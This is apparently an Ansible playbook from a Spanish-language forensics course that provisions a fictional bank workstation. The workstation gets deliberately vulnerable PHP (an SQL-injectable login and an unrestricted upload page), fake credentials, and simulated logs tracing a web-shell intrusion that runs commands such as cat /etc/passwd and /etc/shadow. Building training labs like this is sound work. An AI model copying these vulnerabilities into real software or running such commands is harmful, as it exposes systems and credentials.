@@ -1,0 +1,1725 @@
+---
+# =============================================================================
+# Escenario 06 - Analisis Forense Digital
+# Banco del Sol - Curso Tectonic BHU Uruguay
+# =============================================================================
+# Playbook de configuracion base: prepara el entorno forense,
+# crea imagenes de disco y volcado de memoria de la estacion
+# de trabajo, e instala herramientas de analisis en el VM del instructor/alumno.
+# =============================================================================
+
+- name: "Escenario 06 - Configuracion Base del Entorno Forense"
+  hosts: all
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    # =========================================================================
+    # FACTS Y PREPARACION DEL SISTEMA
+    # =========================================================================
+    - name: Recopilar facts del sistema
+      ansible.builtin.setup:
+        gather_subset:
+          - network
+          - hardware
+          - virtual
+
+    - name: Definir variable de escenario
+      ansible.builtin.set_fact:
+        scenario_name: "06_forensia"
+        scenario_description: "Analisis Forense Digital - Banco del Sol"
+
+    # =========================================================================
+    # CONFIGURACION DE RED
+    # =========================================================================
+    - name: Configurar hostname segun maquina
+      ansible.builtin.hostname:
+        name: "{{ inventory_hostname }}"
+
+    - name: Configurar /etc/hosts
+      ansible.builtin.lineinfile:
+        path: /etc/hosts
+        line: "{{ hostvars[item].ansible_host }} {{ item }}"
+        state: present
+      loop: "{{ groups['all'] }}"
+      when: hostvars[item].ansible_host is defined
+
+# =============================================================================
+# PLAY 2: Preparar la estacion de trabajo (workstation)
+# =============================================================================
+- name: "Preparar estacion de trabajo - Simular entorno corporativo"
+  hosts: workstation
+  become: true
+  vars_files:
+    - vars/defaults.yml
+
+  tasks:
+    # =========================================================================
+    # INSTALAR PAQUETES BASE
+    # =========================================================================
+    - name: Actualizar cache de paquetes
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar paquetes base del sistema
+      ansible.builtin.apt:
+        name:
+          - openssh-server
+          - apache2
+          - libapache2-mod-php
+          - php
+          - php-mysql
+          - mysql-server
+          - postfix
+          - dovecot-imapd
+          - cron
+          - logrotate
+          - rsyslog
+          - sudo
+          - vim
+          - nano
+          - wget
+          - curl
+          - net-tools
+          - iputils-ping
+          - tcpdump
+          - unzip
+          - zip
+          - tar
+          - htop
+          - tmux
+          - git
+          - libreoffice-writer
+          - libreoffice-calc
+          - evolution
+          - firefox-esr
+          - xdg-utils
+          - trash-cli
+          - tree
+          - findutils
+          - procps
+          - psmisc
+          - lsof
+          - strace
+        state: present
+
+    - name: Instalar paquetes adicionales
+      ansible.builtin.apt:
+        name:
+          - cups
+          - avahi-daemon
+          - samba
+          - nfs-common
+          - cifs-utils
+        state: present
+
+    # =========================================================================
+    # CREAR USUARIOS DEL SISTEMA
+    # =========================================================================
+    - name: Crear usuario normal - maria.garcia
+      ansible.builtin.user:
+        name: maria.garcia
+        comment: "Maria Garcia - Departamento de Operaciones"
+        home: /home/maria.garcia
+        shell: /bin/bash
+        password: "$6$rounds=656000$kFzGx8qW$pQ2r4T6y8u0i2o4p6a8s0d2f4g6h8j0k2l4"
+        create_home: yes
+        groups:
+          - sudo
+          - cdrom
+          - floppy
+          - audio
+          - dip
+          - video
+          - plugdev
+          - netdev
+        state: present
+
+    - name: Crear usuario normal - carlos.lopez
+      ansible.builtin.user:
+        name: carlos.lopez
+        comment: "Carlos Lopez - Desarrollador"
+        home: /home/carlos.lopez
+        shell: /bin/bash
+        password: "$6$rounds=656000$aBcDeFgH$iJkLmNoPqRsTuVwXyZ0aB1c2D3e4F5g6H7i"
+        create_home: yes
+        groups:
+          - sudo
+        state: present
+
+    - name: Crear usuario de servicio - www-data (verificar)
+      ansible.builtin.user:
+        name: www-data
+        shell: /usr/sbin/nologin
+        system: yes
+        state: present
+
+    # =========================================================================
+    # CONFIGURAR APACHE
+    # =========================================================================
+    - name: Habilitar modulo rewrite de Apache
+      apache2_module:
+        name: rewrite
+        state: present
+
+    - name: Habilitar modulo headers de Apache
+      apache2_module:
+        name: headers
+        state: present
+
+    - name: Copiar configuracion del portal bancario
+      ansible.builtin.copy:
+        src: files/apache/banco_del_sol.conf
+        dest: /etc/apache2/sites-available/banco_del_sol.conf
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Habilitar sitio del portal bancario
+      ansible.builtin.command: a2ensite banco_del_sol.conf
+      changed_when: false
+
+    - name: Deshabilitar sitio por defecto
+      ansible.builtin.command: a2dissite 000-default.conf
+      changed_when: false
+      ignore_errors: yes
+
+    # =========================================================================
+    # CREAR ESTRUCTURA DEL PORTAL BANCARIO
+    # =========================================================================
+    - name: Crear directorio del portal
+      ansible.builtin.file:
+        path: /var/www/html/banco_del_sol
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0755'
+
+    - name: Crear pagina principal del portal
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE html>
+          <html lang="es">
+          <head>
+              <meta charset="UTF-8">
+              <title>Banco del Sol - Portal Bancario</title>
+              <style>
+                  body { font-family: Arial, sans-serif; background: #f5f5f5; }
+                  .header { background: #1a237e; color: white; padding: 20px; text-align: center; }
+                  .container { max-width: 800px; margin: 50px auto; background: white; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                  .login-form { margin-top: 20px; }
+                  .login-form input { width: 100%; padding: 10px; margin: 5px 0 15px 0; border: 1px solid #ddd; }
+                  .login-form button { background: #1a237e; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+                  .footer { text-align: center; padding: 20px; color: #666; }
+              </style>
+          </head>
+          <body>
+              <div class="header">
+                  <h1>Banco del Sol</h1>
+                  <p>Sistema de Banca en Linea</p>
+              </div>
+              <div class="container">
+                  <h2>Acceso al Sistema</h2>
+                  <form class="login-form" action="login.php" method="POST">
+                      <label for="usuario">Usuario:</label>
+                      <input type="text" id="usuario" name="usuario" placeholder="Ingrese su usuario">
+                      <label for="password">Contrasena:</label>
+                      <input type="password" id="password" name="password" placeholder="Ingrese su contrasena">
+                      <button type="submit">Ingresar</button>
+                  </form>
+              </div>
+              <div class="footer">
+                  <p>Banco del Sol - Todos los derechos reservados 2024</p>
+                  <p>Sistema interno - No acceder desde redes externas</p>
+              </div>
+          </body>
+          </html>
+        dest: /var/www/html/banco_del_sol/index.html
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Crear script de login (vulnerable a SQLi)
+      ansible.builtin.copy:
+        content: |
+          <?php
+          // Portal Bancario - Login
+          // NOTA: Este script tiene vulnerabilidad de SQL injection intencional
+          $db_host = "localhost";
+          $db_user = "admin_banco";
+          $db_pass = "B@nc0d3lSol_2024";
+          $db_name = "banco_del_sol";
+
+          if ($_SERVER["REQUEST_METHOD"] == "POST") {
+              $usuario = $_POST["usuario"];
+              $password = $_POST["password"];
+
+              $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+
+              if ($conn->connect_error) {
+                  die("Error de conexion: " . $conn->connect_error);
+              }
+
+              // VULNERABILIDAD: SQL Injection - query sin prepared statements
+              $query = "SELECT * FROM usuarios WHERE usuario='$usuario' AND password='$password'";
+              $result = $conn->query($query);
+
+              if ($result && $result->num_rows > 0) {
+                  $row = $result->fetch_assoc();
+                  session_start();
+                  $_SESSION["usuario"] = $row["usuario"];
+                  $_SESSION["nombre"] = $row["nombre"];
+                  header("Location: dashboard.php");
+                  exit();
+              } else {
+                  echo "<script>alert('Credenciales incorrectas'); window.history.back();</script>";
+              }
+
+              $conn->close();
+          }
+          ?>
+        dest: /var/www/html/banco_del_sol/login.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Crear dashboard basico
+      ansible.builtin.copy:
+        content: |
+          <?php
+          session_start();
+          if (!isset($_SESSION["usuario"])) {
+              header("Location: index.html");
+              exit();
+          }
+          ?>
+          <!DOCTYPE html>
+          <html lang="es">
+          <head><title>Banco del Sol - Dashboard</title></head>
+          <body>
+              <h1>Bienvenido, <?php echo $_SESSION["nombre"]; ?></h1>
+              <p>Panel de operaciones - Banco del Sol</p>
+              <a href="soporte.php">Soporte Tecnico</a> |
+              <a href="logout.php">Cerrar Sesion</a>
+          </body>
+          </html>
+        dest: /var/www/html/banco_del_sol/dashboard.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Crear pagina de soporte (para subida de archivos)
+      ansible.builtin.copy:
+        content: |
+          <?php
+          // Soporte Tecnico - Portal de Tickets
+          if ($_SERVER["REQUEST_METHOD"] == "POST") {
+              if (isset($_FILES["archivo"])) {
+                  $target_dir = "uploads/";
+                  if (!is_dir($target_dir)) {
+                      mkdir($target_dir, 0755, true);
+                  }
+                  $target_file = $target_dir . basename($_FILES["archivo"]["name"]);
+                  if (move_uploaded_file($_FILES["archivo"]["tmp_name"], $target_file)) {
+                      echo "<p>Archivo subido correctamente: $target_file</p>";
+                  } else {
+                      echo "<p>Error al subir el archivo.</p>";
+                  }
+              }
+          }
+          ?>
+          <!DOCTYPE html>
+          <html><body>
+              <h1>Soporte Tecnico - Banco del Sol</h1>
+              <form method="POST" enctype="multipart/form-data">
+                  <p>Adjuntar archivo de incidencia:</p>
+                  <input type="file" name="archivo">
+                  <button type="submit">Subir</button>
+              </form>
+          </body></html>
+        dest: /var/www/html/banco_del_sol/soporte.php
+        owner: www-data
+        group: www-data
+        mode: '0644'
+
+    - name: Crear directorio de uploads
+      ansible.builtin.file:
+        path: /var/www/html/banco_del_sol/uploads
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0755'
+
+    - name: Crear directorios de logs de Apache
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        owner: adm
+        group: adm
+        mode: '0750'
+      loop:
+        - /var/log/apache2
+        - /var/log/apache2/archivos
+
+    # =========================================================================
+    # CONFIGURAR SERVICIO SSH
+    # =========================================================================
+    - name: Configurar SSH
+      ansible.builtin.lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: "{{ item.regexp }}"
+        line: "{{ item.line }}"
+        state: present
+      loop:
+        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no' }
+        - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
+        - { regexp: '^#?Port ', line: 'Port 22' }
+        - { regexp: '^#?Protocol', line: 'Protocol 2' }
+        - { regexp: '^#?X11Forwarding', line: 'X11Forwarding yes' }
+        - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 6' }
+        - { regexp: '^#?AllowUsers', line: 'AllowUsers maria.garcia carlos.lopez admin_local' }
+
+    - name: Reiniciar servicio SSH
+      ansible.builtin.systemd:
+        name: sshd
+        state: restarted
+        enabled: yes
+
+    # =========================================================================
+    # CREAR ARCHIVOS DE LOG DEL SISTEMA
+    # =========================================================================
+    - name: Crear logs del sistema simulados
+      ansible.builtin.copy:
+        content: "{{ item.content }}"
+        dest: "{{ item.path }}"
+        owner: syslog
+        group: adm
+        mode: '0640'
+      loop:
+        - path: /var/log/auth.log
+          content: |
+            Jul 10 08:00:01 workstation CRON[1234]: pam_unix(cron:session): session opened for user root by (uid=0)
+            Jul 10 08:00:01 workstation CRON[1234]: pam_unix(cron:session): session closed for user root
+            Jul 10 08:15:22 workstation sshd[5678]: Accepted password for maria.garcia from 10.10.2.50 port 52341 ssh2
+            Jul 10 08:15:22 workstation sshd[5678]: pam_unix(sshd:session): session opened for user maria.garcia by (uid=0)
+            Jul 10 09:30:45 workstation sudo: maria.garcia : TTY=pts/0 ; PWD=/home/maria.garcia ; USER=root ; COMMAND=/usr/bin/apt update
+            Jul 10 09:30:45 workstation sudo: pam_unix(sudo:session): session opened for user root by maria.garcia(uid=1000)
+            Jul 10 10:00:12 workstation sshd[5678]: pam_unix(sshd:session): session closed for user maria.garcia
+            Jul 10 10:15:33 workstation sshd[5679]: Accepted password for carlos.lopez from 10.10.2.50 port 52890 ssh2
+            Jul 10 10:15:33 workstation sshd[5679]: pam_unix(sshd:session): session opened for user carlos.lopez by (uid=0)
+            Jul 10 11:30:00 workstation CRON[1234]: pam_unix(cron:session): session opened for user root by (uid=0)
+            Jul 10 12:00:00 workstation sshd[5679]: pam_unix(sshd:session): session closed for user carlos.lopez
+            Jul 10 14:30:00 workstation kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.100 DST=10.10.2.50 PROTO=TCP SPT=4444 DPT=22
+            Jul 10 16:00:00 workstation sshd[5680]: Failed password for invalid user admin from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:02 workstation sshd[5680]: Failed password for invalid user admin from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:04 workstation sshd[5680]: Failed password for invalid user administrator from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:06 workstation sshd[5680]: Failed password for invalid user root from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:08 workstation sshd[5680]: Failed password for invalid user test from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:10 workstation sshd[5680]: Failed password for invalid user user from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:12 workstation sshd[5680]: Failed password for invalid user guest from 203.0.113.50 port 44332 ssh2
+            Jul 10 16:00:15 workstation sshd[5680]: Connection closed by 203.0.113.50 port 44332 [preauth]
+            Jul 10 16:05:00 workstation sshd[5681]: Failed password for root from 198.51.100.23 port 12345 ssh2
+            Jul 10 16:05:02 workstation sshd[5681]: Failed password for root from 198.51.100.23 port 12345 ssh2
+            Jul 10 16:05:04 workstation sshd[5681]: Failed password for root from 198.51.100.23 port 12345 ssh2
+            Jul 10 16:05:06 workstation sshd[5681]: Connection closed by 198.51.100.23 port 12345 [preauth]
+            Jul 11 08:00:01 workstation CRON[1234]: pam_unix(cron:session): session opened for user root by (uid=0)
+            Jul 11 08:00:01 workstation CRON[1234]: pam_unix(cron:session): session closed for user root
+
+    - name: Crear logs de syslog simulados
+      ansible.builtin.copy:
+        content: |
+          Jul 10 08:00:01 workstation systemd[1]: Starting Daily apt activities...
+          Jul 10 08:00:15 workstation systemd[1]: Started Daily apt activities.
+          Jul 10 08:30:00 workstation systemd[1]: Starting Apache2 Service...
+          Jul 10 08:30:01 workstation systemd[1]: Started The Apache HTTP Server.
+          Jul 10 10:00:00 workstation kernel: [    0.000000] Linux version 5.15.0-generic
+          Jul 10 10:00:00 workstation kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz
+          Jul 10 12:00:00 workstation CRON[1235]: (root) CMD (/usr/local/bin/backup.sh)
+          Jul 10 14:00:00 workstation kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.100 DST=10.10.2.50 PROTO=TCP SPT=8080 DPT=4444
+          Jul 10 14:30:00 workstation kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.10.1.10 DST=10.10.2.50 PROTO=TCP SPT=3306 DPT=4444
+          Jul 10 15:00:00 workstation systemd[1]: Starting Logrotate Service...
+          Jul 10 15:00:01 workstation systemd[1]: Started Logrotate Service.
+        dest: /var/log/syslog
+        owner: syslog
+        group: adm
+        mode: '0640'
+
+    - name: Crear logs de kern.log
+      ansible.builtin.copy:
+        content: |
+          Jul 10 08:00:00 workstation kernel: [    0.000000] Linux version 5.15.0-generic (buildd@lcy02-amd64-034)
+          Jul 10 08:00:00 workstation kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.0-generic root=/dev/sda1 ro quiet
+          Jul 10 08:00:00 workstation kernel: [    0.000000] BIOS-provided physical RAM map:
+          Jul 10 10:00:00 workstation kernel: [UFW BLOCK] IN=eth0 OUT= MAC=08:00:27:bb:02:01:08:00:27:aa:01:01 SRC=10.10.1.10 DST=10.10.2.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 DF PROTO=TCP SPT=43210 DPT=4444 WINDOW=65535 RES=0x00 SYN URGP=0
+        dest: /var/log/kern.log
+        owner: syslog
+        group: adm
+        mode: '0640'
+
+    - name: Crear logs de dpkg.log
+      ansible.builtin.copy:
+        content: |
+          2024-07-10 08:15:00 status installed openssh-server:amd64 8.9p1-3
+          2024-07-10 08:15:01 status installed ssh-import-id:amd64 5.11-0ubuntu1
+          2024-07-10 08:20:00 install netcat-openbsd:amd64 <none> 1.218-4ubuntu1
+          2024-07-10 08:20:00 status half-installed netcat-openbsd:amd64 1.218-4ubuntu1
+          2024-07-10 08:20:01 status installed netcat-openbsd:amd64 1.218-4ubuntu1
+          2024-07-10 08:25:00 install nmap:amd64 <none> 7.93+dfsg-1
+          2024-07-10 08:25:01 status installed nmap:amd64 7.93+dfsg-1
+          2024-07-10 09:00:00 install python3-pip:amd64 <none> 22.0.2+dfsg-1ubuntu0.1
+          2024-07-10 09:00:01 status installed python3-pip:amd64 22.0.2+dfsg-1ubuntu0.1
+        dest: /var/log/dpkg.log
+        owner: root
+        group: adm
+        mode: '0640'
+
+    # =========================================================================
+    # CREAR ARCHIVOS DE USUARIO SIMULADOS
+    # =========================================================================
+    - name: Crear directorios del usuario maria.garcia
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0755'
+      loop:
+        - /home/maria.garcia/Documents
+        - /home/maria.garcia/Downloads
+        - /home/maria.garcia/Desktop
+        - /home/maria.garcia/.mozilla/firefox
+        - /home/maria.garcia/.local/share/recently-used.xbel
+
+    - name: Crear documentos de trabajo de Maria
+      ansible.builtin.copy:
+        content: "{{ item.content }}"
+        dest: "{{ item.path }}"
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0644'
+      loop:
+        - path: /home/maria.garcia/Documents/informe_operaciones_julio.txt
+          content: |
+            INFORME MENSUAL - DEPARTAMENTO DE OPERACIONES
+            Julio 2024
+            ====================
+
+            Resumen Ejecutivo:
+            Las operaciones del banco se han mantenido dentro de los parametros
+            normales durante el mes de julio. Se procesaron un total de 15,432
+            transacciones con un volumen total de USD 2,845,000.
+
+            Hallazgos Principales:
+            - 3 incidentes menores reportados
+            - Actualizacion de politicas de acceso completada
+            - Auditoria interna programada para agosto
+
+            Personal Asignado:
+            - Maria Garcia (Coordinadora)
+            - Carlos Lopez (Desarrollo)
+            - Ana Martinez (Soporte)
+            - Pedro Fernandez (Seguridad)
+
+            Documentos sensibles: No compartir fuera del departamento.
+            Clave del compartido: Operaciones@2024
+        - path: /home/maria.garcia/Documents/notas_reunion.txt
+          content: |
+            Notas de Reunion - 09/07/2024
+            Tema: Planificacion trimestral Q3
+            Asistentes: Maria, Carlos, Ana, Pedro
+
+            Puntos tratados:
+            1. Migracion a nuevo sistema de core banking
+            2. Actualizacion de politicas de seguridad
+            3. Capacitacion en respuesta a incidentes
+            4. Presupuesto para herramientas de monitoreo
+
+            Acciones:
+            - Maria: Preparar documentacion de requerimientos
+            - Carlos: Evaluacion tecnica del nuevo sistema
+            - Ana: Cronograma de capacitaciones
+            - Pedro: Auditoria de permisos actuales
+        - path: /home/maria.garcia/Documents/accesos_sistemas.txt
+          content: |
+            Acceso a Sistemas - Departamento de Operaciones
+            Ultima actualizacion: 01/07/2024
+
+            Servidor de Base de Datos:
+            Host: 10.10.2.20
+            Puerto: 5432
+            Base: operaciones_db
+            Usuario: ops_reader
+            Password: 0psR34d3r_2024
+
+            Servidor de Archivos:
+            Host: 10.10.2.10
+            Share: //fileserver/operaciones
+            Usuario: maria.garcia
+            Password: M4r1a_F1l3s!
+
+            Portal Web Interno:
+            URL: https://intranet.bancodelsol.uy
+            Usuario: mgarcia
+            Password: Maria#2024!
+
+            IMPORTANTE: Este documento debe mantenerse en reserva.
+            No compartir por correo electronico.
+        - path: /home/maria.garcia/Documents/backup_credentials.txt
+          content: |
+            Credenciales de Backup - CONFIDENCIAL
+
+            Servidor de Base de Datos:
+            user: db_backup
+            pass: B@ckup_DB#2024
+
+            NAS Backup:
+            user: backup_admin
+            pass: N4s_B@ckup!2024
+
+            Credenciales Antiguas (rotadas):
+            user: admin_old
+            pass: admin123 (ELIMINADA)
+        - path: /home/maria.garcia/Downloads/reporte_auditoria_q2.pdf
+          content: |
+            %PDF-1.4
+            Este es un archivo PDF simulado para el escenario forense.
+            Contenido: Reporte de auditoria Q2 2024
+            Clasificacion: CONFIDENCIAL - Solo para uso interno
+            Resultado: Se encontraron 5 vulnerabilidades criticas en la red
+            Acciones requeridas: Actualizar politicas de firewall
+        - path: /home/maria.garcia/Desktop/acceso_rapido.txt
+          content: |
+            Accesos Rapidos - Maria Garcia
+
+            Intranet: https://intranet.bancodelsol.uy
+            Correo: https://mail.bancodelsol.uy
+            Soporte TI: https://soporte.bancodelsol.uy
+            VPN Corporativa: vpn.bancodelsol.uy
+            Portal RH: https://rrhh.bancodelsol.uy
+
+            IP Servidor Desarrollo: 10.10.2.30
+            IP Servidor QA: 10.10.2.40
+
+            Nota: Si problemas con VPN, llamar a soporte TI: ext 4521
+      no_log: true
+
+    - name: Crear historial de bash del usuario
+      ansible.builtin.copy:
+        content: |
+          #1688966400:0:0:0:0:mariagarcia:0:0
+          ls
+          cd Documents
+          cat informe_operaciones_julio.txt
+          nano notas_reunion.txt
+          scp reporte.pdf maria.garcia@10.10.2.10:/backups/
+          sudo apt update
+          sudo apt upgrade -y
+          cat .bash_history | tail -20
+          exit
+        dest: /home/maria.garcia/.bash_history
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0600'
+
+    # =========================================================================
+    # CREAR HISTORIAL DE NAVEGADOR (FIREFOX)
+    # =========================================================================
+    - name: Crear historial de Firefox simulado
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE NETSCAPE-Bookmark-file-1>
+          <!-- This is an automatically generated file.
+               It will be read and overwritten.
+               DO NOT EDIT! -->
+          <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
+          <TITLE>Bookmarks</TITLE>
+          <H1>Bookmarks</H1>
+          <DL><p>
+              <DT><H3 ADD_DATE="1688880000" LAST_MODIFIED="1688966400">Bancos</DT>
+              <DL><p>
+                  <DT><A HREF="https://www.brou.com.uy" ADD_DATE="1688880000">BROU - Banco Republica</A>
+                  <DT><A HREF="https://intranet.bancodelsol.uy" ADD_DATE="1688880000">Intranet Banco del Sol</A>
+                  <DT><A HREF="https://portal.bancodelsol.uy" ADD_DATE="1688880000">Portal Corporativo</A>
+              </DL><p>
+              <DT><H3 ADD_DATE="1688880000" LAST_MODIFIED="1688966400">Trabajo</DT>
+              <DL><p>
+                  <DT><A HREF="https://mail.google.com" ADD_DATE="1688880000">Gmail</A>
+                  <DT><A HREF="https://drive.google.com" ADD_DATE="1688880000">Google Drive</A>
+                  <DT><A HREF="https://trello.com" ADD_DATE="1688880000">Trello</A>
+              </DL><p>
+          </DL><p>
+        dest: /home/maria.garcia/.mozilla/firefox/places.sqlite
+        owner: maria.garcia
+        group: maria.garcia
+        mode: '0644'
+
+    # =========================================================================
+    # CREAR ARCHivos DEL SERVIDOR WEB (LOGS SIMULADOS)
+    # =========================================================================
+    - name: Crear access.log de Apache simulado
+      ansible.builtin.copy:
+        content: |
+          10.10.2.50 - - [10/Jul/2024:08:00:01 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [10/Jul/2024:08:00:02 +0000] "GET /login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [10/Jul/2024:08:00:03 +0000] "POST /login.php HTTP/1.1" 200 456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [10/Jul/2024:08:00:04 +0000] "GET /dashboard.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          172.16.0.100 - - [10/Jul/2024:10:30:15 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:16 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:17 +0000] "POST /login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:18 +0000] "GET /login.php' OR 1=1-- HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:19 +0000] "GET /uploads/ HTTP/1.1" 403 456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:20 +0000] "POST /soporte.php HTTP/1.1" 200 890 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:21 +0000] "GET /uploads/cmd.php HTTP/1.1" 200 123 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:22 +0000] "GET /uploads/cmd.php?cmd=id HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:23 +0000] "GET /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:24 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:25 +0000] "GET /uploads/cmd.php?cmd=uname+-a HTTP/1.1" 200 200 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:26 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/shadow HTTP/1.1" 403 456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:27 +0000] "GET /uploads/cmd.php?cmd=ls+-la+/var/www/html/ HTTP/1.1" 200 567 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          172.16.0.100 - - [10/Jul/2024:10:30:28 +0000] "GET /uploads/cmd.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2340 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+          10.10.2.50 - - [10/Jul/2024:14:00:00 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+          10.10.2.50 - - [10/Jul/2024:14:00:01 +0000] "GET /dashboard.php HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        dest: /var/log/apache2/access.log
+        owner: adm
+        group: adm
+        mode: '0644'
+
+    - name: Crear error.log de Apache simulado
+      ansible.builtin.copy:
+        content: |
+          [Wed Jul 10 10:30:17.456789 2024] [php:error] [pid 2345] [client 172.16.0.100] PHP Warning: include(): Failed opening '' for inclusion in /var/www/html/banco_del_sol/login.php on line 12
+          [Wed Jul 10 10:30:18.123456 2024] [php:error] [pid 2345] [client 172.16.0.100] You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+          [Wed Jul 10 10:30:20.789012 2024] [php:error] [pid 2345] [client 172.16.0.100] PHP Warning: move_uploaded_file(): Unable to move '/tmp/phpXXXXXX' to '/var/www/html/banco_del_sol/uploads/cmd.php' in /var/www/html/banco_del_sol/soporte.php on line 8
+        dest: /var/log/apache2/error.log
+        owner: adm
+        group: adm
+        mode: '0644'
+
+    # =========================================================================
+    # CONFIGURAR CRON JOBS SIMULADOS
+    # =========================================================================
+    - name: Crear cron jobs del sistema
+      ansible.builtin.copy:
+        content: |
+          # /etc/crontab: system-wide crontab
+          SHELL=/bin/sh
+          PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+          # m h dom mon dow user  command
+          17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+          25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+          47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+          52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+          */5 *   * * *   root    /usr/local/bin/system_check.sh > /dev/null 2>&1
+        dest: /etc/crontab
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Crear script de verificacion del sistema
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          # System health check script
+          /usr/bin/logger "System check completed at $(date)"
+          /bin/true
+        dest: /usr/local/bin/system_check.sh
+        owner: root
+        group: root
+        mode: '0755'
+
+    # =========================================================================
+    # CONFIGURAR RED Y FIREWALL
+    # =========================================================================
+    - name: Configurar UFW basico
+      community.general.ufw:
+        direction: "{{ item.direction }}"
+        policy: "{{ item.policy }}"
+        rule: "{{ item.rule | default(omit) }}"
+        from_ip: "{{ item.from_ip | default(omit) }}"
+        to_port: "{{ item.to_port | default(omit) }}"
+        proto: "{{ item.proto | default(omit) }}"
+      loop:
+        - { direction: incoming, policy: deny }
+        - { direction: outgoing, policy: allow }
+        - { direction: incoming, rule: allow, to_port: 22, proto: tcp }
+        - { direction: incoming, rule: allow, to_port: 80, proto: tcp }
+        - { direction: incoming, rule: allow, to_port: 443, proto: tcp }
+        - { direction: incoming, rule: allow, from_ip: 10.10.0.0/24, to_port: 22, proto: tcp }
